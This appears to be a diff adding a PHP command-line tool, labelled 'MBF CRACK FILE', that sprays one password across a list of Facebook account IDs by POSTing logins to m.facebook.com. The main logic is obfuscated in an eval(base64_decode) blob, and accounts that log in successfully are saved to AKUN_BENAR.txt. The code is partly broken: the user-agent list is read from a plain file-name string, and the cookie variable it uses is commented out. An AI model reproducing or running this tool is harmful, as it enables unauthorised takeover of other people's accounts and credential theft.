@@ -1,0 +1,36 @@
+<?php
+error_reporting(0);
+/*
+  * RIFALDO ALDO
+*/
+function check($idk, $sandi) {
+	$fileua = 'user-agents.txt';
+	$useragent = $fileua[rand(0, count($fileua) - 1)];
+/*
+	$kuki = 'kuki.txt';
+	touch($kuki);
+*/
+$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
+	curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$idk.'&pass='.$sandi.'&login=Login');
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_HEADER, 0);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+
+	curl_setopt($ch, CURLOPT_COOKIEJAR, $kuki);
+	curl_setopt($ch, CURLOPT_COOKIEFILE, $kuki);
+
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+	curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
+	$output = curl_exec($ch) or die('Can\'t access '.$url);
+	if(stristr($output, '<title>Facebook</title>') || stristr($output, 'id="checkpointSubmitButton"')) {
+		return TRUE;
+	} else {
+		return FALSE;
+	}
+}
+eval(base64_decode("JG5jID0iXGVbMG0iOwokcHV0aWggPSJcZVsxOzM3bSI7CiRoaXRhbSA9IlxlWzA7MzBtIjsKJGJpcnUgPSJcZVswOzM0bSI7CiRiaXJ1MiA9IlxlWzE7MzRtIjsKJGhpamF1ID0iXGVbMDszMm0iOwokaGlqYXUyID0iXGVbMTszMm0iOwokY3lhbiA9IlxlWzA7MzZtIjsKJGxpZ2h0X2N5YW4gPSJcZVsxOzM2bSI7CiRtZXJhaCA9IlxlWzA7MzFtIjsKJGxpZ2h0X3JlZCA9IlxlWzE7MzFtIjsKJHB1cnBsZSA9IlxlWzA7MzVtIjsKJGxpZ2h0X3B1cnBsZSA9IlxlWzE7MzVtIjsKJGJyb3duID0iXGVbMDszM20iOwokeWVsbG93ID0iXGVbMTszM20iOwokZ3JheSA9IlxlWzA7MzBtIjsKJGxpZ2h0X2dyYXkgPSJcZVswOzM3bSI7CiRiYW5uZXIgPSAkbWVyYWguIgpbK109PT09PT09PT09PT09PT09PT09PT09PT09PT1bK10KIHwkYmlydSBBVVRIT1IgJG1lcmFoOiRoaWphdTIgUklGQUxETyBBTERPJG1lcmFoICAgICAgIHwKIHwkYmlydSBUT09MICAgJG1lcmFoOiRoaWphdTIgTUJGIENSQUNLIEZJTEUkbWVyYWggICAgIHwKWytdPT09PT09PT09PT09PT09PT09PT09PT09PT09WytdXG4iOwokZmlsZSA9ICRfU0VSVkVSW2FyZ3ZdWzFdOwplY2hvICIkcHV0aWggTWFzdWtrYW4gZmlsZSBJRCBUYXJnZXQ6JHllbGxvdyAiOwokaWRsaXN0ID0gdHJpbShmZ2V0cyhTVERJTikpOwplY2hvICIkcHV0aWggVHVsaXMgcGFzc3dvcmQ6JHllbGxvdyAiOwokc2FuZGkgPSB0cmltKGZnZXRzKFNURElOKSk7CmlmKCFlbXB0eSgkc2FuZGkpICYmICFlbXB0eSgkaWRsaXN0KSkgewoJJGlkZGxpc3QgPSBmaWxlKCRpZGxpc3QpOwoJJHRpZCA9IGNvdW50KCRpZGRsaXN0KTsKCXByaW50ICRiYW5uZXI7Ci8qCWJyLmZpbmRfbGluayh1cmxfcmVnZXg9J2xvZ291dC5waHAnKS50ZXh0CgluYW1hID0gcmUuZmluZGFsbChyJ1woKC4qYT8pXCknLG5hbWEpWzBdKi8KCXByaW50ICRiaXJ1LiJUT1RBTCBJRCAiLiRtZXJhaC4iWyIuJGhpamF1LiIkdGlkIi4kbWVyYWguIl0gIi4kcHV0aWguIiBNZW5jb2JhIGNyYWNrIGRlbmdhbiBwYXNzd29yZCIuJG1lcmFoLiIgWyIuJHllbGxvdy4kc2FuZGkuJG1lcmFoLiJdXG4iLiRuYzsKCWZvcmVhY2goJGlkZGxpc3QgYXMgJGVtYWlsKSB7CgkJJGlkayA9IHN1YnN0cigkZW1haWwsIDAsIHN0cmxlbigkZW1haWwpIC0gMSk7CgkJaWYoY2hlY2sodXJsZW5jb2RlKCRpZGspLCB1cmxlbmNvZGUoJHNhbmRpKSkpIHsKLyoJCQlwcmludCAkcGFzcy4iID0+ICIuJGdyZWVuLiJJbmkgQmVuYXIgXG4iLiRuYzsqLwoJCQlwcmludCAkYmlydS4iWyIuJGhpamF1LiJCRU5BUiIuJGJpcnUuIl0iLiAkcHV0aWguIiBJRCIuJG1lcmFoLiIgOiAiLiRoaWphdTIuJGlkay4kcHV0aWguIiB8ICIuJHB1dGloLiJQYXNzd29yZCIuJG1lcmFoLiIgOiAiLiRoaWphdTIuJHNhbmRpLiIgXG4iLiRuYzsKCQkJJHN2ID0gZm9wZW4oJ0FLVU5fQkVOQVIudHh0JywnYScpOwoJCQlmd3JpdGUoJHN2LCdJRDogJy4kaWRrLicgICAgfCBQQVNTOiAnLiRzYW5kaSk7CgkJCWZjbG9zZSgkc3YpOwoJCX0gZWxzZSB7CgoJCQlwcmludCAkYmlydS4iWyIuJG1lcmFoLiJTQUxBSCIuJGJpcnUuIl0iLiRwdXRpaC4iIElEIDogJGlkayB8IFBhc3N3b3JkIDogJHNhbmRpIFxuIi4kbmM7CgkJfQoJfQp9IGVsc2UgewoJcHJpbnQgJGJhbm5lcjsKCXByaW50ICIKVXNhZ2U6IHBocCAiLiRmaWxlLiIgW3VzZXJuYW1lXSBbd29yZGxpc3RdIjsKfQplY2hvICJbKl0gQWt1biB0ZXJzaW1wYW4gZGkgZmlsZSIuJGhpamF1LiIgQUtVTl9CRU5BUi50eHQiOwplY2hvICIiOw=="));
+?>
